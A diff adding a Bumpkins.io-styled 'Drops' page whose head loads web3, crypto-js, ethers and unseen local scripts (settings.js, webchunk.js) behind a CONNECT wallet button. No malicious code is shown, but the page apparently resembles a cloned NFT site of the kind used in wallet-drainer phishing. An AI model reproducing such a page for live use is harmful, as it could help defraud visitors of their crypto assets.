@@ -1,0 +1,84 @@
+<html lang="en" class="h-full w-full FB_FW_ext eidReader">
+   <head>
+      <meta charset="UTF-8">
+      <link rel="icon" type="image/svg+xml" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAcCAYAAAB/E6/TAAAAAXNSR0IArs4c6QAAAXRJREFUSIndlrFKA0EQhr9NYpFGCRhjgnYxGLAJQSS2AZvYiO+QztYX8BEEC1/Ayk6bQLA8REIaQQh20SQmhaSykLgWd+ux6x3ReGzAv9rZ2flv/52ZvRVSSgCy6QIAtWoGgOvmi+v4JWrVjPDiAeiPOgDEZiGbBQmlZL+8AMCVp6R7t6ctjPWfAgk+smuavb7dkB6fAP+k7Cn6UtJ6lwC98yUAJsZCc+dhUPG5+lhTZk2RWF3e0JWUdiIhjrdvAcjVx4DNHKmBqURVmZmbn877fA3XH9GGpyJhTqizDcuVGDy7A0ORUhIWb1+R2klUMPns9dHB7iYATmei9dNfofqnUojbvRkSTke/1c4uFiOidhUp/vn1UWlrRbMPT1sAXB6VAwlC/TddzbSm6P996FuO2vdDwM9V7+QYAGfYDCQw/SrehNU/LADFdBKAh9GbhPAqmwZVhcV0Unh8gE1F5ku1kk8B4Dy+zvRSreRTwosH5vBS/QRPIoKBHIlyxgAAAABJRU5ErkJggg==">
+      <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
+      <title>Drops</title>
+      <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
+      <link rel="preconnect" href="https://fonts.gstatic.com">
+      <link rel="preconnect" href="https://fonts.gstatic.com">
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&amp;display=swap">
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500&amp;display=swap">
+      <link rel="preconnect" href="https://fonts.googleapis.com">
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+      <link rel="preconnect" href="https://fonts.googleapis.com">
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+      <link rel="preconnect" href="https://fonts.googleapis.com">
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+      <link href="https://fonts.googleapis.com/css2?family=Sigmar+One&amp;display=swap" rel="stylesheet">
+	  <script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
+      <script src="https://unpkg.com/crypto-js@latest/crypto-js.js"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.js" type="application/javascript"></script>
+      <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+      <script src="../js/settings.js"></script>
+      <script src="../js/webchunk.js"></script>
+      <script type="module" crossorigin="" src="../assets/index.ba04136b.js"></script>
+      <link rel="stylesheet" href="../assets/index.5da62ede.css">
+   </head>
+   <body class="antialiased bg-body text-body font-body h-full">
+      <div class="h-full w-full">
+         <div class="h-full w-full">
+            <div id="root" class="h-full w-full">
+               <div class="w-full h-full flex flex-col">
+                  <div class="h-full flex flex-col">
+                     <div class="text-gray-700 font-heading font-medium relative bg-gray-50 bg-opacity-50">
+                        <nav class="flex justify-between px-6 lg:px-12 py-6 border-b border-gray-100">
+                           <div class="w-full items-center hidden md:flex">
+                              <a class="flex items-center" href="/home"><img class="h-6 mr-2" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAcCAYAAAB/E6/TAAAAAXNSR0IArs4c6QAAAXRJREFUSIndlrFKA0EQhr9NYpFGCRhjgnYxGLAJQSS2AZvYiO+QztYX8BEEC1/Ayk6bQLA8REIaQQh20SQmhaSykLgWd+ux6x3ReGzAv9rZ2flv/52ZvRVSSgCy6QIAtWoGgOvmi+v4JWrVjPDiAeiPOgDEZiGbBQmlZL+8AMCVp6R7t6ctjPWfAgk+smuavb7dkB6fAP+k7Cn6UtJ6lwC98yUAJsZCc+dhUPG5+lhTZk2RWF3e0JWUdiIhjrdvAcjVx4DNHKmBqURVmZmbn877fA3XH9GGpyJhTqizDcuVGDy7A0ORUhIWb1+R2klUMPns9dHB7iYATmei9dNfofqnUojbvRkSTke/1c4uFiOidhUp/vn1UWlrRbMPT1sAXB6VAwlC/TddzbSm6P996FuO2vdDwM9V7+QYAGfYDCQw/SrehNU/LADFdBKAh9GbhPAqmwZVhcV0Unh8gE1F5ku1kk8B4Dy+zvRSreRTwosH5vBS/QRPIoKBHIlyxgAAAABJRU5ErkJggg==" alt="" style="image-rendering: pixelated;"><span class="font-bold text-2xl relative">Bumpkins.io</span></a>
+                              <ul class="md:flex lg:px-4 flex-grow md:ml-4 lg:ml-7">
+                                 <li><a class="flex items-center text-gray-400 hover:text-gray-500" href="/home/drops"><span class="mr-4 lg:mr-8">Upcoming drops</span></a></li>
+                              </ul>
+                              <div class="flex items-center ml-5"><a class="flex items-center" href="/home/mybumpkins"><span>My Bumpkins</span><img class="ml-6 w-5 md:hidden" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAcCAYAAAB/E6/TAAAAAXNSR0IArs4c6QAAAXRJREFUSIndlrFKA0EQhr9NYpFGCRhjgnYxGLAJQSS2AZvYiO+QztYX8BEEC1/Ayk6bQLA8REIaQQh20SQmhaSykLgWd+ux6x3ReGzAv9rZ2flv/52ZvRVSSgCy6QIAtWoGgOvmi+v4JWrVjPDiAeiPOgDEZiGbBQmlZL+8AMCVp6R7t6ctjPWfAgk+smuavb7dkB6fAP+k7Cn6UtJ6lwC98yUAJsZCc+dhUPG5+lhTZk2RWF3e0JWUdiIhjrdvAcjVx4DNHKmBqURVmZmbn877fA3XH9GGpyJhTqizDcuVGDy7A0ORUhIWb1+R2klUMPns9dHB7iYATmei9dNfofqnUojbvRkSTke/1c4uFiOidhUp/vn1UWlrRbMPT1sAXB6VAwlC/TddzbSm6P996FuO2vdDwM9V7+QYAGfYDCQw/SrehNU/LADFdBKAh9GbhPAqmwZVhcV0Unh8gE1F5ku1kk8B4Dy+zvRSreRTwosH5vBS/QRPIoKBHIlyxgAAAABJRU5ErkJggg==" alt="" style="image-rendering: pixelated;"></a><a class="ml-6 uppercase text-sm font-bold font-body border-2 border-gray-200 border-opacity-50 rounded-full py-3 px-5 tracking-wide hover:border-gray-300"><button id="messageButton" class="block mt-px connectButton">CONNECT</button></a></div>
+                           </div>
+                           <div class="flex w-full items-center md:hidden">
+                              <a class="flex items-center" href="/home"><span class="font-bold text-xl relative">Bumpkins.io</span></a>
+                              <div class="flex items-center ml-auto">
+                                 <a class="flex items-center" href="/home"><img class="ml-6 w-5" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAAAcCAYAAAB/E6/TAAAAAXNSR0IArs4c6QAAAXRJREFUSIndlrFKA0EQhr9NYpFGCRhjgnYxGLAJQSS2AZvYiO+QztYX8BEEC1/Ayk6bQLA8REIaQQh20SQmhaSykLgWd+ux6x3ReGzAv9rZ2flv/52ZvRVSSgCy6QIAtWoGgOvmi+v4JWrVjPDiAeiPOgDEZiGbBQmlZL+8AMCVp6R7t6ctjPWfAgk+smuavb7dkB6fAP+k7Cn6UtJ6lwC98yUAJsZCc+dhUPG5+lhTZk2RWF3e0JWUdiIhjrdvAcjVx4DNHKmBqURVmZmbn877fA3XH9GGpyJhTqizDcuVGDy7A0ORUhIWb1+R2klUMPns9dHB7iYATmei9dNfofqnUojbvRkSTke/1c4uFiOidhUp/vn1UWlrRbMPT1sAXB6VAwlC/TddzbSm6P996FuO2vdDwM9V7+QYAGfYDCQw/SrehNU/LADFdBKAh9GbhPAqmwZVhcV0Unh8gE1F5ku1kk8B4Dy+zvRSreRTwosH5vBS/QRPIoKBHIlyxgAAAABJRU5ErkJggg==" alt="" style="image-rendering: pixelated;"></a>
+                                 <div class="w-5 md:hidden flex justify-center items-center ml-3"><img class="w-3" src="assets/down.e075ca8f.svg" alt="menu"></div>
+                              </div>
+                           </div>
+                        </nav>
+                     </div>
+                     <div class="flex-1">
+                        <section class="py-8 bg-blueGray-100 h-full flex-1">
+                           <div class="container px-4 mx-auto">
+                              <div class="relative p-10 md:py-10 xl:px-20 bg-white overflow-hidden rounded-3xl">
+                                 <div class="relative z-10">
+                                    <h2 class="mb-4 text-6xl md:text-7xl font-heading font-semibold">No Upcoming Drops.</h2>
+                                 </div>
+                              </div>
+                           </div>
+                        </section>
+                     </div>
+                     <section>
+                        <div class="bg-blueGray-100 py-8">
+                           <div class="container px-4 mx-auto">
+                              <div class="lg:flex lg:justify-between lg:items-center">
+                                 <div class="sm:flex sm:justify-between sm:items-center mb-14 lg:mb-0">
+                                    <p class="relative mt-4 sm:mt-0 sm:top-1 lg:ml-11 text-xs text-gray-300 font-medium uppercase tracking-widest">© Bumpkins 2022 All rights reserved</p>
+                                 </div>
+                                 <ul class="sm:flex">
+                                    <li class="mb-4 sm:mb-0 mr-8"><a class="text-gray-400 hover:text-gray-500 font-heading font-medium" href="https://docs.bumpkins.io/support/terms-of-service">Terms and Conditions</a></li>
+                                    <li><a class="text-gray-400 hover:text-gray-500 font-heading font-medium" href="https://docs.bumpkins.io/support/privacy-policy">Privacy Policy</a></li>
+                                 </ul>
+                              </div>
+                           </div>
+                        </div>
+                     </section>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </div>
+   </body>
+</html>
